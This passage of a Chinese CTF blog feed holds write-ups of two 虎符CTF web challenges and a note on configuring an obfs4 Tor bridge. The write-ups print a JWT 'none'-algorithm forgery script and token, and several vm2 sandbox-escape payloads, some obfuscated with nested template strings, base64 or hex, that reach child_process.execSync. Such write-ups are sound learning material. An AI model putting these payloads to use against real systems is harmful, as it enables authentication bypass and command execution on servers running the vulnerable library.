class="keyword">return</span> plaintext</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    pk, sk = keygen()</span><br><span class="line">    plaintext = raw_input(<span class="string">'Please input your message: '</span>)</span><br><span class="line">    ciphertext = encipher(plaintext, pk)</span><br><span class="line">    print(<span class="string">'Ciphertext:'</span>, ciphertext)</span><br><span class="line">    plaintext = decipher(ciphertext, pk, sk)</span><br><span class="line">    print(<span class="string">'Plaintext:'</span>, plaintext)</span><br></pre></td></tr></table></figure><p>还有几个misc的题，就不再写题解了，最近有点忙…</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;中午就睡了一会儿起来做题，还被室友给diss了…🙄，搞得下午一直恍恍惚惚… 也做了几道题，简单写下题解吧，师傅们勿捶。。。
    
    </summary>
    
    
      <category term="CTF" scheme="http://ggb0n.cool/categories/CTF/"/>
    
      <category term="比赛划水" scheme="http://ggb0n.cool/categories/CTF/%E6%AF%94%E8%B5%9B%E5%88%92%E6%B0%B4/"/>
    
    
      <category term="反序列化漏洞" scheme="http://ggb0n.cool/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="反序列化逃逸漏洞" scheme="http://ggb0n.cool/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%80%83%E9%80%B8%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="Paillier加密" scheme="http://ggb0n.cool/tags/Paillier%E5%8A%A0%E5%AF%86/"/>
    
  </entry>
  
  <entry>
    <title>虎符CTF两道web学习JS</title>
    <link href="http://ggb0n.cool/2020/04/21/%E8%99%8E%E7%AC%A6CTF%E5%A4%8D%E7%8E%B0/"/>
    <id>http://ggb0n.cool/2020/04/21/%E8%99%8E%E7%AC%A6CTF%E5%A4%8D%E7%8E%B0/</id>
    <published>2020-04-21T11:50:00.000Z</published>
    <updated>2020-05-13T03:10:41.467Z</updated>
    
    <content type="html"><![CDATA[<p>这次的虎符CTF没报上名也是可惜，不过朋友发来题目链接，打开一看是JS的题，还好没报名…😎 JS咱啥也不会呀，不过学习还是要学习的。<a id="more"></a></p><h3 id="easy-login"><a href="#easy-login" class="headerlink" title="easy_login"></a>easy_login</h3><p>考察<code>NodeJS代码审计</code>、<code>JS弱类型</code>、<code>JWT伪造</code></p><h4 id="知识补充"><a href="#知识补充" class="headerlink" title="知识补充"></a>知识补充</h4><p>由于尚未专门学习JS，最近看到赛题就发怵，因为最近的比赛JS的题真是越来越多了😑，补充一些本题涉及的知识点先：</p><ul><li><p>1、NodeJS的框架目录结构</p><blockquote><ul><li>dispatch.js 主进程文件</li><li>worker.js 工作进程</li><li>app.js 应用</li><li>routes.js url路由表</li><li>package.json 依赖模块</li><li>config.js or config/ 配置文件</li><li>controllers/ 业务逻辑相关</li><li>views/ 试图模板</li><li>common/ 跟业务相关的公共模块</li><li>proxy/ 数据访问代理层</li><li>lib/ 跟业务无关的公共模块</li><li>assets/ images|scripts|styles</li><li>bin/ 相关运行脚本</li><li>node_moudules/</li></ul></blockquote><p>一般NodeJS的项目，访问<code>app.js</code>即可访问主文件的代码，而主要的逻辑代码在<code>controllers/api.js</code>中。</p></li><li><p>2、JS弱类型</p><p><code>弱类型</code>即指：数据类型可以被忽略, 一个变量可以赋不同数据类型的值，也可以在不同类型的变量之间进行操作，比如空数组<code>[]</code>与整数<code>1</code>做比较，返回为<code>true</code>；将浮点型数作为数组的索引等等。</p></li></ul><p>面对这个大潮流，JS还是要赶紧学学啊…</p><h4 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h4><p>进入题目之后是个登录页面，没有其他按钮，那么我们看看源代码，可以看到<code>/static/js/app.js</code>的存在，访问之后看到提示：<code>或许该用 koa-static 来处理静态文件，路径该怎么配置？不管了先填个根目录XD</code>，提示<code>static</code>是直接映射到程序根目录的，那么应该可以直接在根目录下进行任意文件的访问，访问一下NodeJS的应用文件<code>app.js</code>试试，回显如下：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> Koa = <span class="built_in">require</span>(<span class="string">'koa'</span>);</span><br><span class="line"><span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">'koa-bodyparser'</span>);</span><br><span class="line"><span class="keyword">const</span> session = <span class="built_in">require</span>(<span class="string">'koa-session'</span>);</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">static</span> = <span class="built_in">require</span>(<span class="string">'koa-static'</span>);</span><br><span class="line"><span class="keyword">const</span> views = <span class="built_in">require</span>(<span class="string">'koa-views'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> crypto = <span class="built_in">require</span>(<span class="string">'crypto'</span>);</span><br><span class="line"><span class="keyword">const</span> &#123; resolve &#125; = <span class="built_in">require</span>(<span class="string">'path'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> rest = <span class="built_in">require</span>(<span class="string">'./rest'</span>);</span><br><span class="line"><span class="keyword">const</span> controller = <span class="built_in">require</span>(<span class="string">'./controller'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> PORT = <span class="number">3000</span>;</span><br><span class="line"><span class="keyword">const</span> app = <span class="keyword">new</span> Koa();</span><br><span class="line"></span><br><span class="line">app.keys = [crypto.randomBytes(<span class="number">16</span>).toString(<span class="string">'hex'</span>)];</span><br><span class="line">global.secrets = [];</span><br><span class="line"></span><br><span class="line">app.use(<span class="keyword">static</span>(resolve(__dirname, <span class="string">'.'</span>)));</span><br><span class="line"></span><br><span class="line">app.use(views(resolve(__dirname, <span class="string">'./views'</span>), &#123;</span><br><span class="line">  extension: <span class="string">'pug'</span></span><br><span class="line">&#125;));</span><br><span class="line"></span><br><span class="line">app.use(session(&#123;<span class="attr">key</span>: <span class="string">'sses:aok'</span>, <span class="attr">maxAge</span>: <span class="number">86400000</span>&#125;, app));</span><br><span class="line"></span><br><span class="line"><span class="comment">// parse request body:</span></span><br><span class="line">app.use(bodyParser());</span><br><span class="line"></span><br><span class="line"><span class="comment">// prepare restful service</span></span><br><span class="line">app.use(rest.restify());</span><br><span class="line"></span><br><span class="line"><span class="comment">// add controllers:</span></span><br><span class="line">app.use(controller());</span><br><span class="line"></span><br><span class="line">app.listen(PORT);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">`app started at port <span class="subst">$&#123;PORT&#125;</span>...`</span>);</span><br></pre></td></tr></table></figure><p>可以看到这里采用了NodeJS的<code>koa</code>框架，该框架的主要逻辑代码当然也是在<code>/controllers/api.js</code>中，果断读取。</p><p>访问<code>/controllers/api.js</code>拿到主要逻辑代码：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> crypto = <span class="built_in">require</span>(<span class="string">'crypto'</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>)</span><br><span class="line"><span class="keyword">const</span> jwt = <span class="built_in">require</span>(<span class="string">'jsonwebtoken'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> APIError = <span class="built_in">require</span>(<span class="string">'../rest'</span>).APIError;</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">    <span class="string">'POST /api/register'</span>: <span class="keyword">async</span> (ctx, next) =&gt; &#123;</span><br><span class="line">        <span class="keyword">const</span> &#123;username, password&#125; = ctx.request.body;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!username || username === <span class="string">'admin'</span>)&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> APIError(<span class="string">'register error'</span>, <span class="string">'wrong username'</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(global.secrets.length &gt; <span class="number">100000</span>) &#123;</span><br><span class="line">            global.secrets = [];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> secret = crypto.randomBytes(<span class="number">18</span>).toString(<span class="string">'hex'</span>);</span><br><span class="line">        <span class="keyword">const</span> secretid = global.secrets.length;</span><br><span class="line">        global.secrets.push(secret)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> token = jwt.sign(&#123;secretid, username, password&#125;, secret, &#123;<span class="attr">algorithm</span>: <span class="string">'HS256'</span>&#125;);</span><br><span class="line"></span><br><span class="line">        ctx.rest(&#123;</span><br><span class="line">            token: token</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">await</span> next();</span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    <span class="string">'POST /api/login'</span>: <span class="keyword">async</span> (ctx, next) =&gt; &#123;</span><br><span class="line">        <span class="keyword">const</span> &#123;username, password&#125; = ctx.request.body;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!username || !password) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> APIError(<span class="string">'login error'</span>, <span class="string">'username or password is necessary'</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> token = ctx.header.authorization || ctx.request.body.authorization || ctx.request.query.authorization;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> sid = <span class="built_in">JSON</span>.parse(Buffer.from(token.split(<span class="string">'.'</span>)[<span class="number">1</span>], <span class="string">'base64'</span>).toString()).secretid;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">console</span>.log(sid)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(sid === <span class="literal">undefined</span> || sid === <span class="literal">null</span> || !(sid &lt; global.secrets.length &amp;&amp; sid &gt;= <span class="number">0</span>)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> APIError(<span class="string">'login error'</span>, <span class="string">'no such secret id'</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> secret = global.secrets[sid];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> user = jwt.verify(token, secret, &#123;<span class="attr">algorithm</span>: <span class="string">'HS256'</span>&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> status = username === user.username &amp;&amp; password === user.password;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(status) &#123;</span><br><span class="line">            ctx.session.username = username;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ctx.rest(&#123;</span><br><span class="line">            status</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">await</span> next();</span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    <span class="string">'GET /api/flag'</span>: <span class="keyword">async</span> (ctx, next) =&gt; &#123;</span><br><span class="line">        <span class="keyword">if</span>(ctx.session.username !== <span class="string">'admin'</span>)&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> APIError(<span class="string">'permission error'</span>, <span class="string">'permission denied'</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> flag = fs.readFileSync(<span class="string">'/flag'</span>).toString();</span><br><span class="line">        ctx.rest(&#123;</span><br><span class="line">            flag</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">await</span> next();</span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    <span class="string">'GET /api/logout'</span>: <span class="keyword">async</span> (ctx, next) =&gt; &#123;</span><br><span class="line">        ctx.session.username = <span class="literal">null</span>;</span><br><span class="line">        ctx.rest(&#123;</span><br><span class="line">            status: <span class="literal">true</span></span><br><span class="line">        &#125;)</span><br><span class="line">        <span class="keyword">await</span> next();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>分析代码可知，主要包含三个路由：<code>/api/register</code>进行注册、<code>/api/login</code>进行登录，<code>/api/flag</code>读取flag，来分析一下代码逻辑。</p><p>首先是<code>register</code>路由：实现了注册账户的功能，通过接受传入的<code>username</code>和<code>password</code>，判断<code>username</code>不为<code>admin</code>之后，随机生成一个<code>secret</code>并为其分配一个<code>secretid</code>作为其在数组中的索引，然后利用<code>secretid</code>、<code>username</code>、 <code>password</code>、<code>secret</code>作为内容选用<code>HS256</code>进行加密，生成一个JWT令牌，此时<code>secret</code>也已经存入全局数组。</p><p><code>login</code>路由：对username检测之后，对登录状态的token进行了拼接，然后从其中提取了<code>secretid</code>的值作为索引去数组中读取<code>secret</code>的值，用该值对token进行验证，通过验证之后，将登录时的username赋值给session中的username。</p><p><code>flag</code>路由：判断username为admin之后，即打印flag。</p><p>至此，解题的思路也就很明确了，我们首先在注册账户时想办法伪造JWT为admin身份，然后用admin账户登录，即可拿到flag。</p><h4 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h4><h5 id="关键点"><a href="#关键点" class="headerlink" title="关键点"></a>关键点</h5><p>关键点就在于如何伪造JWT，代码中生成JWT令牌时采用的时<code>HS256</code>算法，并且<code>secret</code>时随机生成并存入数组中的，爆破怕是很难爆破出来，那就要想别的办法。这里用到的方法是利用<code>none</code>加密算法来伪造，原理如下：</p><blockquote><p>当加密时使用的是<code>none</code>算法，并且秘钥的值为<code>undefined</code>或空的时候，在验证时，即便后面的算法设置为 <code>HS256</code>，验证也还是按照<code>none</code>来进行并且通过验证。</p><p>造成这个漏洞的原因在于：这里验证的时候options选用的是<code>algorithm</code>，而依赖库中正确的是<code>algorithms</code>，正是这个原因造成了上面的漏洞。</p></blockquote><p>我们知道，这个题中在验证token的时候，选用了<code>HS256</code>算法对<code>(token, secret)</code>进行了验证，那么我们如果利用上面的方法去伪造一个用户名为<code>admin</code>、secret为空的JWT，那应该就能伪造成admin身份读取到flag了，不过还有个问题：</p><p>我们伪造的JWT中的<code>secretid</code>要满足<code>sid !== undefined</code>、<code>sid !== null</code>、<code>(sid &lt; global.secrets.length &amp;&amp; sid &gt;= 0) == true</code></p><p>那么就对我们伪造JWT时的secretid提出了较大的调整，不过问题不大，我们前面不是提到了JS的弱类型了嘛，其实我们传一个空数组<code>[]</code>、传一个浮点数<code>0.1</code>等等这些都是可以的啊，空口无凭，让我们实践出真知。</p><h5 id="实操"><a href="#实操" class="headerlink" title="实操"></a>实操</h5><p>访问<code>register</code>进行注册，返回了一个<code>JWT</code>令牌，解码看其中看其中内容：</p><p><img src="http://ggb0n.cool/images/hfctf.png" alt=""></p><p>嗯…没毛病，让我们来伪造JWT吧：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line">token = jwt.encode(&#123;<span class="string">"secretid"</span>:[],<span class="string">"username"</span>: <span class="string">"admin"</span>,<span class="string">"password"</span>: <span class="string">"admin"</span>,<span class="string">"iat"</span>: <span class="number">1587472023</span>&#125;,algorithm=<span class="string">"none"</span>,key=<span class="string">""</span>).decode(encoding=<span class="string">'utf-8'</span>)</span><br><span class="line">print(token)</span><br></pre></td></tr></table></figure><p>得到伪造的JWT：</p><figure class="highlight"><table><tr><td class="code"><pre><span class="line">eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJzZWNyZXRpZCI6W10sInVzZXJuYW1lIjoiYWRtaW4iLCJwYXNzd29yZCI6ImFkbWluIiwiaWF0IjoxNTg3NDcyMDIzfQ.</span><br></pre></td></tr></table></figure><p>然后拿着我们的令牌去登录，登录时在<code>authorization</code>填入伪造的JWT，注意登陆的<code>username</code>和<code>password</code>要与伪造的JWT里的一样（这里我们前面是已经用<code>test/test</code>进行注册了，也就是说已经初始化了<code>secrets</code>数组，这样也更不会造成逻辑上的问题）</p><p><img src="http://ggb0n.cool/images/hfctf1.png" alt=""></p><p>可以看到，此时的<code>status</code>为<code>true</code>，记下此时的<code>sses:aok</code>和<code>sses:aok.sig</code>，这个session中的username值其实已经赋值为admin了，也就是说，这个session是admin登录的session，拿着它就可以读取flag。</p><p>最后，我们去访问<code>/api/flag</code>路由，将记录下的token进行替换，即可伪造为admin身份拿到flag：</p><p><img src="http://ggb0n.cool/images/hfctf2.png" alt=""></p><p>拿到flag，撒花~</p><h3 id="JustEscape"><a href="#JustEscape" class="headerlink" title="JustEscape"></a>JustEscape</h3><p>考察<code>vm2沙箱逃逸</code>、<code>JS模板字符串</code>以及对字符串过滤的集中绕过方式</p><h4 id="知识补充-1"><a href="#知识补充-1" class="headerlink" title="知识补充"></a>知识补充</h4><p>JS模板字符串：</p><blockquote><p>模板字符串使用反引号` 来代替普通字符串中的用双引号和单引号。模板字符串可以包含特定语法（<code>&#39;${expression}&#39;</code>注意是单引号）的占位符。占位符中的表达式和周围的文本会一起传递给一个默认函数，该函数负责将所有的部分连接起来，如果一个模板字符串由表达式开头，则该字符串被称为带标签的模板字符串，该表达式通常是一个函数，它会在模板字符串处理后被调用，在输出最终结果前，你都可以通过该函数来对模板字符串进行操作处理。在模版字符串内使用反引号时，需要在它前面加转义符（\）。</p></blockquote><h4 id="题目分析-1"><a href="#题目分析-1" class="headerlink" title="题目分析"></a>题目分析</h4><p>根据题目的提示，可以执行一些代码，这样的话岂不是直接<code>eval</code>就行了？但是题目提示<code>真的是PHP嘛</code>，emmm…假的吧，这里学到骚姿势，用<code>Error().stack</code>返回报错信息，来看后端采用的架构：</p><p><img src="http://ggb0n.cool/images/hfctf3.png" alt=""></p><p>可以看到后端是一个JS的<code>VM2</code>沙箱，进一步测试发现<code>&#39; &quot; +</code>都被ban掉了，不过利用现有的逃逸方法即可进行逃逸：<a href="https://github.com/patriksimek/vm2/issues/225">VM2(3.8.3)逃逸exp</a></p><p>但是除了前面提到的被ban的字符外，很多函数，比如：<code>process</code>、<code>exec</code>、<code>eval</code>等也都被过滤了，触发黑名单就会赠送一个键盘：</p><p><img src="http://ggb0n.cool/images/hfctf4.png" alt=""></p><p>这里可以通过利用<code>字符串拼接</code>和<code>数组调用</code>（对象的方法或者属性名关键字被过滤的情况下可以把对象当成一个数组，然后数组里面的键名用字符串拼接出来）的方式来绕过关键字的限制，但是这里单、双引号都被ban了，直接进行字符串的拼接肯定是不行，不过可以利用<code>反引号</code>来代替单引号，同时利用<code>模板字符串嵌套</code>来拼接出需要的字符串。</p><p>比如：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`proces`</span>&#125;</span>s`</span>&#125;</span>`</span></span><br></pre></td></tr></table></figure><p>输出<code>process</code></p><p>利用此方法对字符串进行拼接即可绕过过滤，对前面提到的exp进行改进即可成功逃逸。</p><p>另一种绕过方法是利用<code>base64</code>、<code>hex</code>编码进行绕过，不过都是在上面的逃逸exp基础上编码进行进一步绕过的方法。</p><h4 id="解题-1"><a href="#解题-1" class="headerlink" title="解题"></a>解题</h4><p><strong>方法一：利用模板字符串嵌套绕过</strong></p><p>改进的exp如下：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span> (<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">TypeError</span>[<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`prototyp`</span>&#125;</span>e`</span>&#125;</span>`</span>][<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`get_pro`</span>&#125;</span>cess`</span>&#125;</span>`</span>] = <span class="function"><span class="params">f</span>=&gt;</span>f[<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`constructo`</span>&#125;</span>r`</span>&#125;</span>`</span>](<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`return proc`</span>&#125;</span>ess`</span>&#125;</span>`</span>)();</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="built_in">Object</span>.preventExtensions(Buffer.from(<span class="string">``</span>)).a = <span class="number">1</span>;</span><br><span class="line">    &#125;<span class="keyword">catch</span>(e)&#123;</span><br><span class="line">        <span class="keyword">return</span> e[<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`get_pro`</span>&#125;</span>cess`</span>&#125;</span>`</span>](<span class="function"><span class="params">()</span>=&gt;</span>&#123;&#125;).mainModule[<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`requir`</span>&#125;</span>e`</span>&#125;</span>`</span>](<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`child_proces`</span>&#125;</span>s`</span>&#125;</span>`</span>)[<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`exe`</span>&#125;</span>cSync`</span>&#125;</span>`</span>](<span class="string">`cat /flag`</span>).toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)()</span><br></pre></td></tr></table></figure><p>直接将上面的payload填入hackbar的URL栏执行即可：</p><p><img src="http://ggb0n.cool/images/hfctf5.png" alt=""></p><p><strong>方法二：利用base64/hex编码绕过</strong></p><p>首先贴一下逃逸的exp：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">TypeError</span>.prototype.get_process = <span class="function"><span class="params">f</span> =&gt;</span> f.constructor(<span class="string">"return process"</span>)();</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="built_in">Object</span>.preventExtensions(Buffer.from(<span class="string">""</span>)).a = <span class="number">1</span>;</span><br><span class="line">&#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">    e.get_process(<span class="function"><span class="params">()</span> =&gt;</span> &#123; &#125;).mainModule.require(<span class="string">"child_process"</span>).execSync(<span class="string">"cat /flag"</span>).toString();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对前面的exp进行编码，进一步绕过过滤</p><p>base64编码payload：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">global[[<span class="string">`eva`</span>,%<span class="number">20</span><span class="string">`l`</span>].join(<span class="string">``</span>)](Buffer.from(<span class="string">`VHlwZUVycm9yLnByb3RvdHlwZS5nZXRfcHJvY2VzcyA9IGYgPT4gZi5jb25zdHJ1Y3RvcigicmV0dXJuIHByb2Nlc3MiKSgpOwp0cnkgewogICAgT2JqZWN0LnByZXZlbnRFeHRlbnNpb25zKEJ1ZmZlci5mcm9tKCIiKSkuYSA9IDE7Cn0gY2F0Y2ggKGUpIHsKICAgIGUuZ2V0X3Byb2Nlc3MoKCkgPT4geyB9KS5tYWluTW9kdWxlLnJlcXVpcmUoImNoaWxkX3Byb2Nlc3MiKS5leGVjU3luYygiY2F0IC9mbGFnIikudG9TdHJpbmcoKTsKfQ==`</span>,%<span class="number">20</span><span class="string">`base64`</span>).toString(<span class="string">`ascii`</span>));</span><br></pre></td></tr></table></figure><p>hex编码payload：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="built_in">TypeError</span>[<span class="built_in">String</span>.fromCharCode(<span class="number">112</span>,<span class="number">114</span>,<span class="number">111</span>,<span class="number">116</span>,<span class="number">111</span>,<span class="number">116</span>,<span class="number">121</span>,<span class="number">112</span>,<span class="number">101</span>)][<span class="string">`\x67\x65\x74\x5f\x70\x72\x6f\x63\x65\x73\x73`</span>] = <span class="function"><span class="params">f</span>=&gt;</span>f[<span class="string">`\x63\x6f\x6e\x73\x74\x72\x75\x63\x74\x6f\x72`</span>](<span class="string">`\x72\x65\x74\x75\x72\x6e\x20\x70\x72\x6f\x63\x65\x73\x73`</span>)();<span class="keyword">try</span>&#123;<span class="built_in">Object</span>.preventExtensions(Buffer.from(<span class="string">``</span>)).a = <span class="number">1</span>;&#125;<span class="keyword">catch</span>(e)&#123;<span class="keyword">return</span> e[<span class="string">`\x67\x65\x74\x5f\x70\x72\x6f\x63\x65\x73\x73`</span>](<span class="function"><span class="params">()</span>=&gt;</span>&#123;&#125;).mainModule.require((<span class="string">`\x63\x68\x69\x6c\x64\x5f\x70\x72\x6f\x63\x65\x73\x73`</span>))[<span class="string">`\x65\x78\x65\x63\x53\x79\x6e\x63`</span>](<span class="string">`cat /flag`</span>).toString();&#125;&#125;)()</span><br></pre></td></tr></table></figure><p>执行结果：</p><p><img src="http://ggb0n.cool/images/hfctf6.png" alt=""></p><h3 id="小结一下"><a href="#小结一下" class="headerlink" title="小结一下"></a>小结一下</h3><p>这两道题对逐步学习JS还是很有用滴，不过也恐慌了，感觉又啥也不会了😅</p><p>参考：<br><a href="https://www.zhaoj.in/read-6512.html">赵师傅的超详细题解</a><br><a href="https://github.com/patriksimek/vm2/issues/225">VM2(3.8.3)逃逸exp</a><br><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/template_strings">JS模板字符串嵌套</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这次的虎符CTF没报上名也是可惜，不过朋友发来题目链接，打开一看是JS的题，还好没报名…😎 JS咱啥也不会呀，不过学习还是要学习的。
    
    </summary>
    
    
      <category term="CTF" scheme="http://ggb0n.cool/categories/CTF/"/>
    
      <category term="赛题复现" scheme="http://ggb0n.cool/categories/CTF/%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/"/>
    
    
      <category term="JWT伪造" scheme="http://ggb0n.cool/tags/JWT%E4%BC%AA%E9%80%A0/"/>
    
      <category term="JavaScript" scheme="http://ggb0n.cool/tags/JavaScript/"/>
    
      <category term="NodeJS" scheme="http://ggb0n.cool/tags/NodeJS/"/>
    
      <category term="JS沙箱逃逸" scheme="http://ggb0n.cool/tags/JS%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/"/>
    
      <category term="JS模板字符串" scheme="http://ggb0n.cool/tags/JS%E6%A8%A1%E6%9D%BF%E5%AD%97%E7%AC%A6%E4%B8%B2/"/>
    
      <category term="JS弱类型" scheme="http://ggb0n.cool/tags/JS%E5%BC%B1%E7%B1%BB%E5%9E%8B/"/>
    
  </entry>
  
  <entry>
    <title>obfs4网桥问题的处理</title>
    <link href="http://ggb0n.cool/2020/04/16/obfs4%E7%BD%91%E6%A1%A5%E9%97%AE%E9%A2%98%E7%9A%84%E5%A4%84%E7%90%86/"/>
    <id>http://ggb0n.cool/2020/04/16/obfs4%E7%BD%91%E6%A1%A5%E9%97%AE%E9%A2%98%E7%9A%84%E5%A4%84%E7%90%86/</id>
    <published>2020-04-16T01:52:29.000Z</published>
    <updated>2020-04-22T00:15:11.526Z</updated>
    
    <content type="html"><![CDATA[<p>昨天的问题上午刚解决，结果又有新问题… 不过这问题网上好像还有人问了，但是貌似没什么解决方案，还有人说是obfs4的一个bug，着实让我抓狂，感觉是全网第一个解决的人，起码应该是第一篇解决的文章。惬意~🤣<a id="more"></a></p><h3 id="报错问题"><a href="#报错问题" class="headerlink" title="报错问题"></a>报错问题</h3><p>上午成功编译obfs4项目之后，随后就对<code>/etc/tor/torrc</code>文件做了如下的配置：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Log notice file &#x2F;var&#x2F;log&#x2F;tor&#x2F;notices.log</span><br><span class="line">RunAsDaemon 1</span><br><span class="line">ORPort 44443 #注意这个端口官方提供配置是443，不过443可能被占用导致tor启动失败，改一下就行</span><br><span class="line">Exitpolicy reject *:*</span><br><span class="line">BridgeRelay 1</span><br><span class="line">ServerTransportPlugin obfs4 exec &#x2F;usr&#x2F;local&#x2F;bin&#x2F;obfs4proxy</span><br><span class="line">ExtORPort auto</span><br><span class="line">PublishServerDescriptor 0</span><br></pre></td></tr></table></figure><p>然后重启tor服务：<code>service tor restart</code>，查看一下tor的运行状态是没问题，嗯，放心了。</p><p>然后<code>tail -F /var/log/tor/notices.log</code>，原本以为没问题，但是回显结果如下：<br><img src="http://ggb0n.cool/images/obfs4-1.png" alt=""></p><p>没错，报了如下错误：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[warn] Could not launch managed proxy executable at &#39;&#x2F;usr&#x2F;local&#x2F;bin&#x2F;obfs4proxy&#39; (&#39;Permission denied&#39;).</span><br></pre></td></tr></table></figure><p>而成功的回显呢？<br><img src="http://ggb0n.cool/images/obfs4-2.png" alt=""></p><p>没错，是上面这种情况</p><p>然后就疯狂科学上网找解决方式，说是什么要以托管的方式运行，但是就是一直解决不了…</p><h3 id="发现猫腻"><a href="#发现猫腻" class="headerlink" title="发现猫腻"></a>发现猫腻</h3><p>是在多次尝试中，发现了疑似问题的<br>多次restart服务，发现tor服务都正常，当时当终端直接键入<code>tor</code>去运行的时候，就会报错，嗯？？？<br><img src="http://ggb0n.cool/images/obfs4-3.png" alt=""></p><p>不知道是端口占用还是进程没被杀死，但是这应该就是问题所在了，因为终端键入<code>tor</code>其实是执行tor这个程序，而<code>restart</code>是对tor服务的操作，服务成功运行不代表着tor启动了呀，tor不启动，那就不是以托管方式去运行obfs4proxy了呀，所有这就是问题！</p><h3 id="解决问题"><a href="#解决问题" class="headerlink" title="解决问题"></a>解决问题</h3><p>由于最初是yum安装的tor，尝试重装无果，便选择了自己下载源码编译。</p><p>编译、安装完成之后，对<code>/usr/local/etc/tor</code>下的<code>torrc</code>进行前面提到的配置，然后执行可执行程序，在<code>/usr/local/bin</code>中。</p><p>以命令<code>./tor;tail -F /var/log/tor/notices.log</code>同时启动tor和网桥，回显如下：<br><img src="http://ggb0n.cool/images/obfs4-4.png" alt=""></p><p>good! 成功解决。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;昨天的问题上午刚解决，结果又有新问题… 不过这问题网上好像还有人问了，但是貌似没什么解决方案，还有人说是obfs4的一个bug，着实让我抓狂，感觉是全网第一个解决的人，起码应该是第一篇解决的文章。惬意~🤣
    
